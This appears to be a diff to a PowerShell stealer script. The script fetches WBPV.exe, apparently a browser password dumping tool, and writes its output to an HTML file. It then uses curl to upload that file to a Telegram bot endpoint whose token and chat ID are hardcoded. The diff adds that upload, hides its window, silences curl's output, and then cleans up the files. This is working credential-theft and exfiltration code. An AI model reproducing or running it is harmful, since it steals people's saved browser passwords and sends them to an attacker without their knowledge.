@@ -32,7 +32,7 @@ if (!(Get-Command curl -ErrorAction SilentlyContinue)) {
 }
 
 $WBPV = "$env:TEMP\WBPV.exe"
-$WPs = "$env:TEMP\out.html"
+$WPs = "C:\out.html"
 
 if (!(Test-Path $WBPV)) {
   # Download curl
@@ -45,11 +45,8 @@ if (!(Test-Path $WBPV)) {
 }
 
 $msbuild = "curl"
-#$arguments = '-s -F document=@"$WPs" https://api.telegram.org/bot7623697444:AAER5Ph7rbkgJifCvG4cyXhg6XhvSnQvjr4/sendDocument?chat_id=7032729089'
-#start-process $msbuild $arguments -WindowStyle Hidden -Wait
-
-$arguments = '-F document=@"$WPs" https://api.telegram.org/bot7623697444:AAER5Ph7rbkgJifCvG4cyXhg6XhvSnQvjr4/sendDocument?chat_id=7032729089'
-start-process $msbuild $arguments -Wait
+$arguments = '-s -F document=@"C:\out.html" https://api.telegram.org/bot7623697444:AAER5Ph7rbkgJifCvG4cyXhg6XhvSnQvjr4/sendDocument?chat_id=7032729089'
+start-process $msbuild $arguments -WindowStyle Hidden -Wait
 
 $FilePaths1 = @("$env:SystemRoot\Temp\WBPV.exe", "$env:USERPROFILE\AppData\Local\Temp\WBPV.exe")
 $FilePaths = @($WBPV, $WPs)
